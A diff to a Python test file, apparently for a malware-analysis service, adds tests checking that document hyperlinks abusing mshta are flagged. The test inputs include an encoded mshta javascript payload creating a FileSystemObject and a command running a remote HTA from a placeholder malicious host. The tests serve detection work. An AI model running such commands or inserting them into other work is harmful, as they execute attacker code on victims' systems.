@@ -127,3 +127,23 @@ def test_process_link_exclamation_true_positive():
     assert 'msdt_exploit' in heur.signatures
     assert ('https://cdn.discordapp.com/attachments/986484515985825795/986821210044264468/index.htm'
             in tags['network.static.uri'])
+
+
+def test_process_link_mshta_script():
+    ole = Oletools()
+    ole.start()
+    heur, tags = ole._process_link('hyperlink', "mshta%20%22javascript:document.write();"
+                                   "x=function(o)%7breturn%20new%20ActiveXObject(o)%7d;"
+                                   "f=x('Scripting.FileSystemObject');%22%20%20")
+    assert 'mshta' in heur.signatures
+    assert 'T1218.005' in heur.attack_ids
+    assert '9859550f.mshta_javascript' in ole._extracted_files
+
+
+def test_process_link_mshta_link():
+    ole = Oletools()
+    ole.start()
+    heur, tags = ole._process_link('hyperlink', "mshta.exe http://link.to/malicious/page.hta")
+    assert 'mshta' in heur.signatures
+    assert 'T1218.005' in heur.attack_ids
+    assert 'http://link.to/malicious/page.hta' in tags['network.static.uri']
